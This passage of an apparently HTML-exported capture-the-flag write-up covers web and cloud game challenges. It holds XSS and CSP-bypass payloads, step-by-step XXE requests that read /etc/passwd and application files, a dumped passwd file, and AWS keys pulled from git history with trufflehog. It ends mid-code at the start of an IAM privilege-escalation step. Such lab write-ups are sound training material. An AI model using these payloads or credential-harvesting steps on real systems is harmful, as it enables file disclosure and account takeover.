+&lt;pre&gt;&lt;foo&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+&lt;/foo&gt;&lt;/pre&gt;
+&lt;/body&gt;&lt;/html&gt;
+
+attacker 18.222.86.32
+</code></pre></section><section class="print-page" id="objectives-3_recover_the_web_ring-3.5_find_the_next_objective"><h1 id="objectives-3_recover_the_web_ring-3.5_find_the_next_objective-recover-the-web-ring">Recover the Web Ring</h1>
+<h2 id="objectives-3_recover_the_web_ring-3.5_find_the_next_objective-35-find-the-next-objective">3.5 Find the Next Objective</h2>
+<p><img src="Objectives/img/3.5_Find_the_Next_Objective.png"></p>
+<p>Talk to <strong>Alabaster Snowball</strong> for the next objective.</p>
+<h2 id="objectives-3_recover_the_web_ring-3.5_find_the_next_objective-solve">Solve</h2>
+<p><img src="Objectives/img/3.5_Alabaster_Snowball.png"></p></section><section class="print-page" id="objectives-3_recover_the_web_ring-3.6_open_boria_mine_door"><h1 id="objectives-3_recover_the_web_ring-3.6_open_boria_mine_door-recover-the-web-ring">Recover the Web Ring</h1>
+<h2 id="objectives-3_recover_the_web_ring-3.6_open_boria_mine_door-36-open-boria-mine-door">3.6 Open Boria Mine Door</h2>
+<p><img src="Objectives/img/3.6_Open_Boria_Mine_Door.png"></p>
+<p>Open the door to the Boria Mines. Help <strong>Alabaster Snowball</strong> in the Web Ring to get some hints for this challenge.</p>
+<p><img src="Objectives/img/3.6_Open_Boria_Mine_Door_chall.png"></p>
+<h2 id="objectives-3_recover_the_web_ring-3.6_open_boria_mine_door-hints">Hint(s)</h2>
+<p><img src="Objectives/img/3.6_hint1.png"></p>
+<p><img src="Objectives/img/3.6_hint2.png"></p>
+<p><img src="Objectives/img/3.6_hint3.png"></p>
+<h2 id="objectives-3_recover_the_web_ring-3.6_open_boria_mine_door-solve">Solve</h2>
+<h3 id="objectives-3_recover_the_web_ring-3.6_open_boria_mine_door-terminal-answers">Terminal answers</h3>
+<p>1.- Solve: see the source code, there is a comment as hint.
+<img src="Objectives/img/3.6_solve1.png"></p>
+<pre><code class="language-ruby">Payload:  @&amp;@&amp;&amp;W&amp;&amp;W&amp;&amp;&amp;&amp;
+</code></pre>
+<p>2.- Solve: See the source code, there is a comment as hint use it to bypass the CSP filter OUT HTML</p>
+<p><img src="Objectives/img/3.6_solve2.png"></p>
+<pre><code class="language-ruby">Payload: &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert('XSS');&quot;&gt;
+</code></pre>
+<p><img src="Objectives/img/3.6_solve1a.png"></p>
+<p>3.- Solve: see the source code, there is a comment as hint use it to byppass the CSP filter OUT Javascript
+<img src="Objectives/img/3.6_solve3.png"></p>
+<pre><code class="language-ruby">Payload:
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; style=&quot;border:1px solid #ddd;&quot; width=&quot;300&quot; height=&quot;300&quot; viewBox=&quot;0 -5 90 40&quot;&gt;
+    &lt;path d=&quot;M 0 0 L 100 -40&quot; stroke=&quot;blue&quot; stroke-width=&quot;10&quot;/&gt;
+&lt;/svg&gt;
+</code></pre>
+<p><img src="Objectives/img/3.6_solve4.png"></p>
+<p><img src="Objectives/img/3.6_Open_Boria_Mine_Door_completed.png"></p></section><section class="print-page" id="objectives-3_recover_the_web_ring-3.7_find_the_next_objective"><h1 id="objectives-3_recover_the_web_ring-3.7_find_the_next_objective-recover-the-web-ring">Recover the Web Ring</h1>
+<h2 id="objectives-3_recover_the_web_ring-3.7_find_the_next_objective-37-find-the-next-objective">3.7  Find the Next Objective</h2>
+<p><img src="Objectives/img/3.7_Find_the_Next_Objective.png"></p>
+<p>Talk to <strong>Hal Tandybuck</strong> for the next objective.</p>
+<h2 id="objectives-3_recover_the_web_ring-3.7_find_the_next_objective-solve">Solve</h2>
+<p><img src="Objectives/img/3.7_Hal_Tandybuck.png"></p></section><section class="print-page" id="objectives-3_recover_the_web_ring-3.8_glamtariel_s_fountain"><h1 id="objectives-3_recover_the_web_ring-3.8_glamtariel_s_fountain-recover-the-web-ring">Recover the Web Ring</h1>
+<h2 id="objectives-3_recover_the_web_ring-3.8_glamtariel_s_fountain-38-glamtariels-fountain">3.8 Glamtariel's Fountain</h2>
+<p><img src="Objectives/img/3.8_Glamtariel_s_Fountain.png"></p>
+<p>Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to <strong>Hal Tandybuck</strong> in the Web Ring for hints.</p>
+<h2 id="objectives-3_recover_the_web_ring-3.8_glamtariel_s_fountain-hints">Hint(s)</h2>
+<p><img src="Objectives/img/3.8_hint1.png"></p>
+<h2 id="objectives-3_recover_the_web_ring-3.8_glamtariel_s_fountain-solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: goldring-morethansupertopsecret76394734.png
+</code></pre>
+<h2 id="objectives-3_recover_the_web_ring-3.8_glamtariel_s_fountain-terminal-answers">Terminal answers</h2>
+<p>1.- Do a "Drag and Drop" for all the the items to Glamtariel and fountain images.
+<img src="Objectives/img/3.8_solve1.png"></p>
+<p>2.- Keep attention through the dialogs and catch all the <strong>CAPITALIZE WORDS</strong>, those will be give us a clearly hint to solve the challenge.</p>
+<p>My capitalize words list: </p>
+<pre><code class="language-ruby">TAMPER | TRAFFIC FLIES   : A hint to tampper the data sending through POST/GET methods.
+TYPE            : A hint to modify the Content-Type to exploit the vulnerability.
+RINGLIST        : A hint find the file through the exploitation and must be simple e.g ringlist.txt acording to Glamtariel's dialogs.
+APP | PATH  : A hint regarding the default path where docker deploy the APP, this will give us an idea from where is the flag.
+</code></pre>
+<p>3.- Continue doing "Drag and Drop" for all items until get the blue rings, the silver and red. 
+<img src="Objectives/img/3.8_solve2.png"></p>
+<p>4.- See the Glamtariel dialog <strong>"You know what one of my favorite songs is? Silver rings, silver rings..."</strong> &lt;-- see another clear hint.</p>
+<p>5.- Do a "Drag and Drop" and catch the <strong>Silver Ring</strong> traffic with burp suite. </p>
+<pre><code class="language-ruby">POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB=&quot;9d99dd148f14d5ca&quot;; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0
+Content-Length: 52
+Accept: application/json
+Content-Type: application/json
+
+{&quot;imgDrop&quot;:&quot;img2&quot;,&quot;who&quot;:&quot;princess&quot;,&quot;reqType&quot;:&quot;json&quot;}
+</code></pre>
+<p>6.- Change the <strong>Content-Type</strong> header to use XML and change JSON arguments by <strong>XML format</strong>, send the new POST through webproxy.</p>
+<pre><code class="language-ruby">POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB=&quot;9d99dd148f14d5ca&quot;; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0
+Content-Length: 52
+Accept: application/json
+Content-Type: application/xml   &lt;--HERE! 
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;root&gt;
+  &lt;imgDrop&gt;img2&lt;/imgDrop&gt;
+  &lt;who&gt;fountain&lt;/who&gt;
+  &lt;reqType&gt;xml&lt;/reqType&gt;
+&lt;/root&gt;
+</code></pre>
+<p>7.- See the reponse from the server on specific the <code>"appResp"</code> values.</p>
+<pre><code class="language-ruby">I'm one of the few who can discuss anything using that TYPE of language.^Yeah, I can understand a bit, but not communicate with it at all
+</code></pre>
+<p><img src="Objectives/img/3.8_solve7.png"></p>
+<p>8.- Send a new POST payload but now changing the XML <code>"&lt;who&gt;"</code> value by <strong>princess</strong>  </p>
+<pre><code class="language-ruby">POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB=&quot;9d99dd148f14d5ca&quot;; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0
+Content-Length: 52
+Accept: application/json
+Content-Type: application/xml
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;root&gt;
+  &lt;imgDrop&gt;img1&lt;/imgDrop&gt;
+  &lt;who&gt;princess&lt;/who&gt;       &lt;--HERE! 
+  &lt;reqType&gt;xml&lt;/reqType&gt;
+&lt;/root&gt;
+</code></pre>
+<p>9.- See the reponse from server , on specific the <code>"&lt;appResp&gt;"</code> value.</p>
+<pre><code class="language-ruby">I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.
+</code></pre>
+<p><img src="Objectives/img/3.8_solve9.png"></p>
+<p>10.- On this phase the XML arguments <code>"&lt;imgDrop&gt;"</code> and <code>"&lt;who&gt;"</code> any value injected are accepted by server side, the last argument <code>"&lt;reqType&gt;"</code> if we changed the value we received an error or if the XML format is not the correct as well. </p>
+<pre><code class="language-ruby">Sorry, I don't quite understand what you were trying to share. I know many languages but use only a few. Did you forget a root for the language or something else perhaps? It could be that I don't know anything about that also.^Sorry, I didn't understand. I typically only use one TYPE of language
+</code></pre>
+<p><img src="Objectives/img/3.8_solve10.png"></p>
+<p>11.- Same case, if we try to change the format before get the Silver Ring we see the following message:</p>
+<pre><code class="language-ruby">Zoom, Zoom, very hasty, can't do that yet!^Zoom, Zoom, very hasty, can't do that yet!&quot;
+</code></pre>
+<p><img src="Objectives/img/3.8_solve11.png"></p>
+<p>12.- Time to Inject the XXE payloads, notice the server don't offer any clue to read local files to see where we are into server directories.</p>
+<pre><code class="language-ruby">POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB=&quot;9d99dd148f14d5ca&quot;; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0
+Content-Length: 52
+Accept: application/json
+Content-Type: application/xml
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;root&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+  &lt;imgDrop&gt;&amp;xxe;&lt;/imgDrop&gt;
+  &lt;who&gt;fountain&lt;/who&gt;
+  &lt;reqType&gt;xml&lt;/reqType&gt;
+&lt;/root&gt;
+</code></pre>
+<p><img src="Objectives/img/3.8_solve12.png"></p>
+<p>13.- Through all the process the server response on <code>visit</code> argument mostly with <code>none</code> value but in specific cases as "TAMPER error" was included the PATH to see an image.</p>
+<pre><code class="language-ruby">HTTP/2 200 OK
+Server: Werkzeug/2.2.2 Python/3.10.8
+[../snip]
+
+{
+  &quot;appResp&quot;: &quot;Trying to TAMPER with Kringle's favorite cookie recipe or the entrance tickets can't help you Grinchum! I'm not sure what you are looking for but it isn't here! Get out!^Miserable trickster! Please click him out of here.&quot;,
+  &quot;droppedOn&quot;: &quot;none&quot;,
+  &quot;visit&quot;: &quot;static/images/grinchum-supersecret_9364274.png,265px,135px&quot; &lt;-- HERE!
+}
+</code></pre>
+<p><img src="Objectives/img/3.8_solve13.png"></p>
+<p>14.- After spent some long hours at nite and very frustrating, finally we guess the correct path to call the file <code>/app/static/images/ringlist.txt</code>.</p>
+<pre><code class="language-ruby">XXE Payload:
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/ringlist.txt&quot;&gt; ]&gt;
+&lt;root&gt;
+    &lt;imgDrop&gt;&amp;xxe;&lt;/imgDrop&gt;
+    &lt;who&gt;princess&lt;/who&gt;
+    &lt;reqType&gt;xml&lt;/reqType&gt;
+&lt;/root&gt;
+
+Response: 
+
+{
+  &quot;appResp&quot;: &quot;Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)&quot;,
+  &quot;droppedOn&quot;: &quot;none&quot;,
+  &quot;visit&quot;: &quot;static/images/pholder-morethantopsupersecret63842.png,262px,100px&quot;
+}
+</code></pre>
+<p><img src="Objectives/img/3.8_solve14.png"></p>
+<pre><code class="language-ruby">Consult the image: https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png
+The image shows the folder name and files to call.
+
+PATH: /x_phial_pholder_2022/bluering.txt
+PATH: /x_phial_pholder_2022/redring.txt
+</code></pre>
+<p><img src="Objectives/img/3.8_solve14a.png"></p>
+<p>15.- Knowing that we need to call a ring by colors the list should be the follow through XXE exploitation: </p>
+<pre><code class="language-ruby">PATH: /x_phial_pholder_2022/bluering.txt
+PATH: /x_phial_pholder_2022/redring.txt
+PATH: /x_phial_pholder_2022/greenring.txt
+PATH: /x_phial_pholder_2022/silverring.txt    &lt;-- HERE!! 
+PATH: /x_phial_pholder_2022/goldring.txt
+</code></pre>
+<p>16.- The most important data to get the flag is the silverring.txt </p>
+<pre><code class="language-ruby">XXE Payload:
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/silverring.txt&quot;&gt; ]&gt;
+&lt;root&gt;
+    &lt;imgDrop&gt;&amp;xxe;&lt;/imgDrop&gt;
+    &lt;who&gt;princess&lt;/who&gt;
+    &lt;reqType&gt;xml&lt;/reqType&gt;
+&lt;/root&gt;
+
+Response: 
+{
+  &quot;appResp&quot;: &quot;I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!&quot;,
+  &quot;droppedOn&quot;: &quot;none&quot;,
+  &quot;visit&quot;: &quot;static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px&quot;
+}
+</code></pre>
+<p><img src="Objectives/img/3.8_solve16.png"></p>
+<pre><code class="language-ruby">Consult the image: https://glamtarielsfountain.com/static/images/redring-supersupersecret928164.png
+The image shows a new file to call.
+
+PATH: /x_phial_pholder_2022/goldring_to_be_deleted.txt
+</code></pre>
+<p><img src="Objectives/img/3.8_solve16a.png"></p>
+<p>17.- Now call the file <code>/x_phial_pholder_2022/goldring_to_be_deleted.txt</code> through XXE exploitation:</p>
+<pre><code class="language-ruby">XXE Payload: 
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt&quot;&gt; ]&gt;
+&lt;root&gt;
+    &lt;imgDrop&gt;&amp;xxe;&lt;/imgDrop&gt;
+    &lt;who&gt;princess&lt;/who&gt;
+    &lt;reqType&gt;xml&lt;/reqType&gt;
+&lt;/root&gt;
+
+Response:
+
+{
+  &quot;appResp&quot;: &quot;Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.&quot;,
+  &quot;droppedOn&quot;: &quot;none&quot;,
+  &quot;visit&quot;: &quot;none&quot;
+}
+</code></pre>
+<p><img src="Objectives/img/3.8_solve17.png"></p>
+<pre><code class="language-ruby">See that nothing happened, this time we need to move the XXE injection to XML &lt;reqType&gt; argument
+</code></pre>
+<p>18.- Final step, call the file <code>/x_phial_pholder_2022/goldring_to_be_deleted.txt</code> through the argument <code>&lt;reqType&gt;</code></p>
+<pre><code class="language-ruby">XXE Payload: 
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt&quot;&gt; ]&gt;
+&lt;root&gt;
+    &lt;imgDrop&gt;img1&lt;/imgDrop&gt;
+    &lt;who&gt;princess&lt;/who&gt;
+    &lt;reqType&gt;&amp;xxe;&lt;/reqType&gt;    &lt;--HERE! 
+&lt;/root&gt;
+
+Response: 
+
+{
+  &quot;appResp&quot;: &quot;No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!&quot;,
+  &quot;droppedOn&quot;: &quot;none&quot;,
+  &quot;visit&quot;: &quot;static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px&quot;
+}
+</code></pre>
+<p><img src="Objectives/img/3.8_solve18.png"></p>
+<pre><code class="language-ruby">Consult the image: https://glamtarielsfountain.com/static/images/goldring-morethansupertopsecret76394734.png
+The image shows Golden Ring 
+
+goldring-morethansupertopsecret76394734.png  &lt;-- Voila!, FLAG!
+</code></pre>
+<p><img src="Objectives/img/3.8_Glamtariel_s_Fountain_completed.png"></p></section><h1 class='nav-section-title-end'>Ended: 3. Recover the Web Ring</h1>
+                        <h1 class='nav-section-title' id='section-4-recover-the-cloud-ring'>
+                            4. Recover the Cloud Ring <a class='headerlink' href='#section-4-recover-the-cloud-ring' title='Permanent link'>↵</a>
+                        </h1>
+                        <section class="print-page" id="objectives-4_recover_the_cloud_ring-4.1_aws_cli_intro"><h1 id="objectives-4_recover_the_cloud_ring-4.1_aws_cli_intro-recover-the-cloud-ring">Recover the Cloud Ring</h1>
+<h2 id="objectives-4_recover_the_cloud_ring-4.1_aws_cli_intro-41-aws-cli-intro">4.1 AWS CLI Intro</h2>
+<p><img src="Objectives/img/4.1_AWS_CLI_Intro.png"></p>
+<p>Try out some basic AWS command line skills in this terminal. Talk to <strong>Jill Underpole</strong> in the Cloud Ring for hints.</p>
+<h2 id="objectives-4_recover_the_cloud_ring-4.1_aws_cli_intro-hints">Hint(s)</h2>
+<p><img src="Objectives/img/4.1_hint1.png"></p>
+<h2 id="objectives-4_recover_the_cloud_ring-4.1_aws_cli_intro-solve">Solve</h2>
+<pre><code class="language-ruby">$ aws sts get-caller-identity
+</code></pre>
+<h3 id="objectives-4_recover_the_cloud_ring-4.1_aws_cli_intro-terminal-answers">Terminal answers</h3>
+<pre><code class="language-ruby">$ aws help 
+reat! When you're done, you can quit with q.
+Next, please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY, the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1 .
+https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config
+
+access key AKQAAYRKO7A5Q5XUY2IY,
+secret key  qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf 
+Region us-east-1 
+Format: json 
+
+
+elf@3298c5df39c5:~$ aws sts get-caller-identity
+An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation: The security token included in the request is invalid.
+elf@3298c5df39c5:~$ vim .aws/config 
+elf@3298c5df39c5:~$ vim .aws/credentials 
+elf@3298c5df39c5:~$ aws sts get-caller-identity
+{
+    &quot;UserId&quot;: &quot;AKQAAYRKO7A5Q5XUY2IY&quot;,
+    &quot;Account&quot;: &quot;602143214321&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:iam::602143214321:user/elf_helpdesk&quot;
+}
+elf@3298c5df39c5:~$
+</code></pre>
+<p><img src="Objectives/img/4.1_AWS_CLI_Intro_solve.png"></p>
+<p><img src="Objectives/img/4.1_AWS_CLI_Intro_completed.png"></p></section><section class="print-page" id="objectives-4_recover_the_cloud_ring-4.2_find_the_next_objective"><h1 id="objectives-4_recover_the_cloud_ring-4.2_find_the_next_objective-recover-the-cloud-ring">Recover the Cloud Ring</h1>
+<h2 id="objectives-4_recover_the_cloud_ring-4.2_find_the_next_objective-42-find-the-next-objective">4.2 Find the Next Objective</h2>
+<p><img src="Objectives/img/4.2_Find_the_Next_Objective.png"></p>
+<p>Talk to <strong>Jill Underpole</strong> for the next objective.</p>
+<h2 id="objectives-4_recover_the_cloud_ring-4.2_find_the_next_objective-solve">Solve</h2>
+<p><img src="Objectives/img/4.2_Jill_Underpole.png"></p></section><section class="print-page" id="objectives-4_recover_the_cloud_ring-4.3_trufflehog_search"><h1 id="objectives-4_recover_the_cloud_ring-4.3_trufflehog_search-recover-the-cloud-ring">Recover the Cloud Ring</h1>
+<h2 id="objectives-4_recover_the_cloud_ring-4.3_trufflehog_search-43-trufflehog-search">4.3 Trufflehog Search</h2>
+<p><img src="Objectives/img/4.3_Trufflehog_Search.png"></p>
+<p>Use Trufflehog to find secrets in a Git repo. Work with <strong>Jill Underpole</strong> in the Cloud Ring for hints. What's the name of the file that has AWS credentials?</p>
+<h2 id="objectives-4_recover_the_cloud_ring-4.3_trufflehog_search-hints">Hint(s)</h2>
+<p><img src="Objectives/img/4.3_hint1.png"></p>
+<p><img src="Objectives/img/4.3_hint2.png"></p>
+<h2 id="objectives-4_recover_the_cloud_ring-4.3_trufflehog_search-solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: put_policy.py
+</code></pre>
+<h3 id="objectives-4_recover_the_cloud_ring-4.3_trufflehog_search-terminal-answers">Terminal answers</h3>
+<p>1.- Inital scan review </p>
+<pre><code class="language-ruby">elf@ef250a6290e8:~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts 
+🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷
+
+Found unverified result 🐷🔑❓
+Detector Type: AWS
+Decoder Type: PLAIN
+Raw result: AKIAAIDAYRANYAHGQOHD
+Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 &lt;-- HERE see this commit ID 
+File: put_policy.py
+Email: asnowball &lt;alabaster@northpolechristmastown.local&gt;
+Repository: https://haugfactory.com/asnowball/aws_scripts
+Timestamp: 2022-09-07 07:53:12 -0700 -0700
+Line: 6
+
+Found unverified result 🐷🔑❓
+Detector Type: Gitlab
+Decoder Type: PLAIN
+Raw result: add-a-file-using-the-
+Email: alabaster snowball &lt;alabaster@northpolechristmastown.local&gt;
+Repository: https://haugfactory.com/asnowball/aws_scripts
+Timestamp: 2022-09-06 19:54:48 +0000 UTC
+Line: 14
+Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85
+File: README.md
+
+Found unverified result 🐷🔑❓
+Detector Type: Gitlab
+Decoder Type: BASE64
+Raw result: add-a-file-using-the-
+Email: alabaster snowball &lt;alabaster@northpolechristmastown.local&gt;
+Repository: https://haugfactory.com/asnowball/aws_scripts
+Timestamp: 2022-09-06 19:54:48 +0000 UTC
+Line: 14
+Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85
+File: README.md
+
+elf@ef250a6290e8:~$ 
+</code></pre>
+<p>2.- Review the rest with no verification flag </p>
+<pre><code class="language-ruby">elf@ef250a6290e8:~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts --no-verification
+🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷
+
+Found unverified result 🐷🔑❓
+Detector Type: AWS
+Decoder Type: PLAIN
+Raw result: AKIAAIDAYRANYAHGQOHD
+Commit: 106d33e1ffd53eea753c1365eafc6588398279b5
+File: put_policy.py
+Email: asnowball &lt;alabaster@northpolechristmastown.local&gt;
+Repository: https://haugfactory.com/asnowball/aws_scripts
+Timestamp: 2022-09-07 07:53:12 -0700 -0700
+Line: 6
+
+Found unverified result 🐷🔑❓
+Detector Type: Gitlab
+Decoder Type: PLAIN
+Raw result: add-a-file-using-the-
+File: README.md
+Email: alabaster snowball &lt;alabaster@northpolechristmastown.local&gt;
+Repository: https://haugfactory.com/asnowball/aws_scripts
+Timestamp: 2022-09-06 19:54:48 +0000 UTC
+Line: 14
+Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85
+
+Found unverified result 🐷🔑❓
+Detector Type: Gitlab
+Decoder Type: BASE64
+Raw result: add-a-file-using-the-
+Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85
+File: README.md
+Email: alabaster snowball &lt;alabaster@northpolechristmastown.local&gt;
+Repository: https://haugfactory.com/asnowball/aws_scripts
+Timestamp: 2022-09-06 19:54:48 +0000 UTC
+Line: 14
+
+elf@ef250a6290e8:~$ 
+</code></pre>
+<p>3.- Clone the repo and read the content file using git commands </p>
+<pre><code class="language-ruby">elf@9ae78a2aedc7:~$ git clone https://haugfactory.com/asnowball/aws_scripts.git 
+elf@9ae78a2aedc7:~$ cd aws_scripts/
+
+elf@ef250a6290e8:~/aws_scripts$ git diff-tree --no-commit-id --name-only -r 106d33e1ffd53eea753c1365eafc6588398279b5 
+put_policy.py  &lt;--Voila!  FLAG 
+</code></pre>
+<p><img src="Objectives/img/4.3_Trufflehog_Search_completed.png"></p></section><section class="print-page" id="objectives-4_recover_the_cloud_ring-4.4_find_the_next_objective"><h1 id="objectives-4_recover_the_cloud_ring-4.4_find_the_next_objective-recover-the-cloud-ring">Recover the Cloud Ring</h1>
+<h2 id="objectives-4_recover_the_cloud_ring-4.4_find_the_next_objective-44-trufflehog-search">4.4 Trufflehog Search</h2>
+<p><img src="Objectives/img/4.4_Find_the_Next_Objective.png"></p>
+<p>Talk to <strong>Gerty Snowburrow</strong> for the next objective.</p>
+<h2 id="objectives-4_recover_the_cloud_ring-4.4_find_the_next_objective-solve">Solve</h2>
+<p><img src="Objectives/img/4.4_Gerty_Snowburrow.png"></p></section><section class="print-page" id="objectives-4_recover_the_cloud_ring-4.5_exploitation_via_aws_cli"><h1 id="objectives-4_recover_the_cloud_ring-4.5_exploitation_via_aws_cli-recover-the-cloud-ring">Recover the Cloud Ring</h1>
+<h2 id="objectives-4_recover_the_cloud_ring-4.5_exploitation_via_aws_cli-45-exploitation-via-aws-cli">4.5  Exploitation via AWS CLI</h2>
+<p><img src="Objectives/img/4.5_Exploitation_via_AWS_CLI.png"></p>
+<p>Flex some more advanced AWS CLI skills to escalate privileges! Help <strong>Gerty Snowburrow</strong> in the Cloud Ring to get hints for this challenge.</p>
+<h2 id="objectives-4_recover_the_cloud_ring-4.5_exploitation_via_aws_cli-hints">Hint(s)</h2>
+<p><img src="Objectives/img/4.5_hint1.png"></p>
+<p><img src="Objectives/img/4.5_hint2.png"></p>
+<h2 id="objectives-4_recover_the_cloud_ring-4.5_exploitation_via_aws_cli-solve">Solve</h2>
+<h3 id="objectives-4_recover_the_cloud_ring-4.5_exploitation_via_aws_cli-terminal-answers">Terminal answers</h3>
+<p><strong>Note</strong>: Continue terminal log from challenge 4.2 Trufflehog Search</p>
+<p>4.- Extract the AWS keys from chall Trufflehog Search </p>
+<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ git show 106d33e1ffd53eea753c1365eafc6588398279b5:put_policy.py
+
+import boto3
+import json
+
+
+iam = boto3.client('iam',
+    region_name='us-east-1',
+    aws_access_key_id=&quot;AKIAAIDAYRANYAHGQOHD&quot;,
+    aws_secret_access_key=&quot;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&quot;,
+)
+# arn:aws:ec2:us-east-1:accountid:instance/*
+response = iam.put_user_policy(
